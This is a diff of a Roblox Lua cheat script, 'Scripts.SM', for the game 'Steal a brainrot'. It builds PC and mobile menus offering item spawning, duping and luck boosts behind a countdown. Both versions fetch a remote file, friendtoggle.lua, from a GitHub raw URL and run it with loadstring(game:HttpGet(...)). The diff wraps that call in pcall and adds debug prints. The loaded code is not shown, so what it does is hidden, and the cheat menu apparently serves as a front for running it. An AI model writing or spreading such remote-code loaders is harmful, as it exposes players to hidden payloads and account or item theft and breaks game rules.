@@ -1,11 +1,11 @@
 --[[
-   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
-  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
- | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
-  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
-  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
- |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
-                                                                     
+   _____ _____ _____ _____ _____ _______ _____ _____ __ __
+  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
+ | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \ / |
+  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
+  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
+ |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
+                                                                    
                         Scripts.SM | Premium Scripts
                         Made by: Scripter.SM
                         Discord: discord.gg/cnUAk7uc3n
@@ -14,15 +14,36 @@
 --====================================================================--
 -- Services
 --====================================================================--
-local Players          = game:GetService("Players")
+local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-local TweenService     = game:GetService("TweenService")
-local RunService       = game:GetService("RunService")
-local StarterGui       = game:GetService("StarterGui")
-local player           = Players.LocalPlayer
-local playerGui        = player:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/friendtoggle.lua", true))()
+-- SAFE PLAYER LOADING
+local player = Players.LocalPlayer
+if not player then
+    error("[Scripts.SM] FATAL: LocalPlayer is nil! Must be LocalScript in StarterPlayerScripts.")
+end
+
+local playerGui = player:WaitForChild("PlayerGui", 10)
+if not playerGui then
+    error("[Scripts.SM] FATAL: PlayerGui not found after 10s!")
+end
+
+print("[Scripts.SM] PlayerGui loaded. Starting...")
+
+-- LOAD FRIENDTOGGLE.LUA (YOUR ORIGINAL URL)
+pcall(function()
+    local url = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/friendtoggle.lua"
+    local success, result = pcall(game.HttpGet, game, url, true)
+    if success and result then
+        loadstring(result)()
+        print("friendtoggle.lua loaded successfully")
+    else
+        warn("Failed to load friendtoggle.lua (404 or blocked). Skipping...")
+    end
+end)
 
 --====================================================================--
 -- CONFIG (shared)
@@ -36,12 +57,13 @@ local CONFIG = {
 --====================================================================--
 -- Detect Device
 --====================================================================--
-local IS_MOBILE = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+local IS_MOBILE = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
 
 --====================================================================--
 -- PC GUI (Original – Pixel-perfect)
 --====================================================================--
 local function buildPCGui()
+    print("Building PC GUI...")
     local gui = Instance.new("ScreenGui")
     gui.Name = "sm_main_pc"
     gui.ResetOnSpawn = false
@@ -139,7 +161,6 @@ local function buildPCGui()
     content.Parent = main
 
     local tabs, tabBtns = {}, {}
-
     local function selectTab(name)
         for _, p in pairs(tabs) do p.Visible = false end
         for _, b in pairs(tabBtns) do
@@ -167,7 +188,6 @@ local function buildPCGui()
         page.BackgroundTransparency = 1
         page.Visible = false
         page.Parent = content
-
         tabs[name] = page
         tabBtns[name] = btn
 
@@ -322,7 +342,6 @@ local function buildPCGui()
         notif = Instance.new("ScreenGui")
         notif.Name = "sm_notif"
         notif.Parent = playerGui
-
         local f = Instance.new("Frame")
         f.Size = UDim2.new(0, 460, 0, 130)
         f.Position = UDim2.new(0.5, -230, 0, 20)
@@ -363,7 +382,6 @@ local function buildPCGui()
         timer.Parent = f
 
         TweenService:Create(f, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
-
         local countdown = CONFIG.DELAY_BEFORE_SCRIPT
         local conn = RunService.Heartbeat:Connect(function()
             countdown -= RunService.Heartbeat:Wait()
@@ -409,11 +427,13 @@ local function buildPCGui()
             return spawnBox.Text ~= spawnBox.PlaceholderText and spawnBox.Text or ""
         end)
     end)
+
     dupeBtn.MouseButton1Click:Connect(function()
         execute("Duping", function()
             return dupeBox.Text ~= dupeBox.PlaceholderText and dupeBox.Text or ""
         end)
     end)
+
     luckBtn.MouseButton1Click:Connect(function()
         local val = luckInput.Text
         if val == luckInput.PlaceholderText or not tonumber(val) then
@@ -438,6 +458,7 @@ end
 -- MOBILE GUI (Scaled, Touch-Friendly)
 --====================================================================--
 local function buildMobileGui()
+    print("Building Mobile GUI...")
     local gui = Instance.new("ScreenGui")
     gui.Name = "sm_main_mobile"
     gui.ResetOnSpawn = false
@@ -452,7 +473,6 @@ local function buildMobileGui()
     main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
     main.BorderSizePixel = 0
     main.Parent = gui
-
     local corner = Instance.new("UICorner", main)
     corner.CornerRadius = UDim.new(0.04, 0)
 
@@ -538,7 +558,6 @@ local function buildMobileGui()
     content.Parent = main
 
     local tabs, tabBtns = {}, {}
-
     local function selectTab(name)
         for _, p in pairs(tabs) do p.Visible = false end
         for _, b in pairs(tabBtns) do
@@ -566,7 +585,6 @@ local function buildMobileGui()
         page.BackgroundTransparency = 1
         page.Visible = false
         page.Parent = content
-
         tabs[name] = page
         tabBtns[name] = btn
 
@@ -674,7 +692,7 @@ local function buildMobileGui()
     -- Input Focus
     local function setupInput(box, placeholder)
         local defaultCol = Color3.fromRGB(200, 220, 255)
-        local activeCol  = Color3.new(1,1,1)
+        local activeCol = Color3.new(1,1,1)
         box.Focused:Connect(function()
             if box.Text == "" or box.Text == placeholder then
                 box.Text = ""
@@ -702,7 +720,6 @@ local function buildMobileGui()
         notif = Instance.new("ScreenGui")
         notif.Name = "sm_notif"
         notif.Parent = playerGui
-
         local f = Instance.new("Frame")
         f.Size = UDim2.fromScale(0.9, 0.18)
         f.Position = UDim2.fromScale(0.5, 0.05)
@@ -744,7 +761,6 @@ local function buildMobileGui()
         timer.Parent = f
 
         TweenService:Create(f, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
-
         local countdown = CONFIG.DELAY_BEFORE_SCRIPT
         local conn = RunService.Heartbeat:Connect(function(dt)
             countdown -= dt
@@ -789,9 +805,11 @@ local function buildMobileGui()
     spawnBtn.MouseButton1Click:Connect(function()
         execute("Spawning", function() return spawnBox.Text end)
     end)
+
     dupeBtn.MouseButton1Click:Connect(function()
         execute("Duping", function() return dupeBox.Text end)
     end)
+
     luckBtn.MouseButton1Click:Connect(function()
         local txt = luckInput.Text
         local n = tonumber(txt)
@@ -812,7 +830,6 @@ local function buildMobileGui()
     -- Drag (Touch + Mouse)
     local dragging = false
     local dragStart, startPos
-
     local function startDrag(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
             dragging = true
@@ -826,7 +843,6 @@ local function buildMobileGui()
             end)
         end
     end
-
     local function updateDrag(input)
         if not dragging then return end
         local delta = input.Position - dragStart
@@ -835,7 +851,6 @@ local function buildMobileGui()
             startPos.Y.Scale, startPos.Y.Offset + delta.Y
         )
     end
-
     titleBar.InputBegan:Connect(startDrag)
     titleBar.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
@@ -850,10 +865,18 @@ end
 --====================================================================--
 -- LAUNCH
 --====================================================================--
-if IS_MOBILE then
-    buildMobileGui()
-    print("Scripts.SM – Mobile Version Loaded")
-else
-    buildPCGui()
-    print("Scripts.SM – PC Version Loaded")
-end
+task.spawn(function()
+    print("=== Scripts.SM Debug ===")
+    print("TouchEnabled:", UserInputService.TouchEnabled)
+    print("KeyboardEnabled:", UserInputService.KeyboardEnabled)
+    print("MouseEnabled:", UserInputService.MouseEnabled)
+    print("IS_MOBILE:", IS_MOBILE)
+
+    if IS_MOBILE then
+        buildMobileGui()
+        print("Scripts.SM – Mobile Version Loaded")
+    else
+        buildPCGui()
+        print("Scripts.SM – PC Version Loaded")
+    end
+end)
